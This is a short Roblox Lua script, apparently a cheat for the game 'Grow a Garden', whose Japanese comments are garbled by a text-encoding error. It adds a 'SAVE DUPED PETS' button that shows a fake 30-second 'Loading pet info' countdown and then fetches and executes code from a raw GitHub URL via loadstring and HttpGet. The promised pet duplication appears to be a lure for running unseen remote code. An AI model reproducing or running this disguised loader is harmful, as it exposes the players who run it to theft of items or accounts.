local statusLabel -- ã‚°ãƒ­ãƒ¼ãƒãƒ«ã«ä¿æŒã—ã¦ãŠã

local function setStatus(text)
	-- æ—¢å­˜ãƒ©ãƒ™ãƒ«ã‚’å‰Šé™¤ï¼ˆå¯èƒ½ãªå ´åˆï¼‰
	if statusLabel then
		statusLabel:Destroy()
	end
	-- æ–°ã—ã„ãƒ©ãƒ™ãƒ«ä½œæˆ
	statusLabel = MainSection:NewLabel("SAVE STATUS: " .. text)
end

-- åˆæœŸè¡¨ç¤º
setStatus("Ready")

-- SAVE DUPED PETS ãƒœã‚¿ãƒ³
MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
	task.spawn(function()
		for i = 30, 1, -1 do
			setStatus("âŒ› Loading pet info... (" .. i .. "s)")
			wait(1)
		end

		setStatus("ğŸš€ Booting...")

		local success, err = pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
		end)

		if success then
			setStatus("âœ… Success!")
		else
			setStatus("âŒ Error: " .. tostring(err))
		end
	end)
end)
